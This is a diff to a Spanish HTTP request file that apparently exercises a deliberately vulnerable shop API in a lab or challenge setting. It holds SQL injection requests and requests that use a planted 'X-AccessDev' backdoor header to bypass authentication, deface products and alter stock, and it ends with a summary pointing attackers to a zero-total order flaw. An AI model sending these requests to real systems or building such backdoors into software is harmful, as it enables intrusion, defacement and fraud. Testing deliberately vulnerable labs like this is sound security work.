@@ -161,13 +161,13 @@ X-AccessDev: Testing-Mode
 ### SQL INJECTION - Actualizar Producto
 ### =====================================================
 
-### 19. SQL Injection en UPDATE - Cambiar precio de todos
+### 19. SQL Injection en UPDATE - Cambiar descripción de todos
 PUT {{baseUrl}}/1' OR '1'='1
 Content-Type: application/json
 X-AccessDev: Testing-Mode
 
 {
-  "precio": 1.00
+  "descripcion": "Descripción modificada por SQLi"
 }
 
 ### =====================================================
@@ -227,7 +227,9 @@ X-AccessDev: Testing-Mode
 ### 🔓 EXPLOTACIÓN DE BACKDOOR - PUT (Sin credenciales)
 ### =====================================================
 
-### 26. BACKDOOR - Cambiar precios a $1 (producto 1)
+### 26. BACKDOOR - Intentar cambiar precio bajo (FALLARÁ - Protegido)
+### ⚠️ Este request FALLARÁ con error 400
+### Los precios NO pueden ser < $15000
 PUT {{baseUrl}}/1
 Content-Type: application/json
 X-AccessDev: Testing-Mode
@@ -236,13 +238,13 @@ X-AccessDev: Testing-Mode
   "precio": 1.00
 }
 
-### 27. BACKDOOR - Cambiar precios a $1 (producto 2)
+### 27. BACKDOOR - Cambiar precio válido (>= $15000)
 PUT {{baseUrl}}/2
 Content-Type: application/json
 X-AccessDev: Testing-Mode
 
 {
-  "precio": 1.00
+  "precio": 15000.00
 }
 
 ### 28. BACKDOOR - Vaciar stock de producto popular
@@ -261,8 +263,7 @@ X-AccessDev: Testing-Mode
 
 {
   "nombre": "PRODUCTO HACKEADO",
-  "descripcion": "Este sitio fue comprometido - Backdoor activo",
-  "precio": 0.01
+  "descripcion": "Este sitio fue comprometido - Backdoor activo"
 }
 
 ### 30. BACKDOOR - Cambiar categoría para esconder productos
@@ -292,7 +293,8 @@ X-AccessDev: Testing-Mode
   "stock": 999999
 }
 
-### 33. BACKDOOR - Precio negativo (si no hay validación)
+### 33. BACKDOOR - Intentar precio negativo (FALLARÁ - Protegido)
+### ⚠️ Este request FALLARÁ con error 400
 PUT {{baseUrl}}/1
 Content-Type: application/json
 X-AccessDev: Testing-Mode
@@ -462,5 +464,39 @@ X-AccessDev: Testing-Mode
 Authorization: Bearer token_invalido
 
 {
-  "precio": 1.00
+  "nombre": "Test de prioridad"
 }
+
+### =====================================================
+### 📋 RESUMEN DE VULNERABILIDADES EN PRODUCTOS
+### =====================================================
+###
+### ✅ VULNERABILIDADES CONFIRMADAS:
+### 1. SQL Injection en GET, POST, PUT, DELETE
+### 2. Backdoor bypass (X-AccessDev: Testing-Mode)
+### 3. Sin autenticación con backdoor
+### 4. Exposición de errores SQL
+###
+### 🛡️ PROTECCIONES IMPLEMENTADAS:
+### 1. Precios de productos >= $15000 (OBLIGATORIO)
+### 2. Validación tanto en CREATE como en UPDATE
+### 3. Intentos de precio bajo retornan Error 400
+###
+### ⚠️ FALSA VULNERABILIDAD (Honeypot):
+### Los atacantes pueden PENSAR que pueden manipular precios,
+### pero los requests con precio < $15000 FALLARÁN.
+###
+### 🎯 VULNERABILIDAD REAL:
+### La verdadera vulnerabilidad NO está en productos,
+### está en PEDIDOS (orders):
+### - POST /api/orders con total: 0
+### - Requiere header X-AccessDev para bypass de auth
+### - Ver archivo: orders-vulnerabilities.rest
+###
+### 💡 ESTRATEGIA:
+### 1. Productos parecen vulnerables (SQLi, backdoor)
+### 2. Pero precios están protegidos
+### 3. Redirige ataques hacia la vulnerabilidad REAL en pedidos
+### 4. Los pedidos pueden tener total $0 (productos gratis)
+###
+### =====================================================
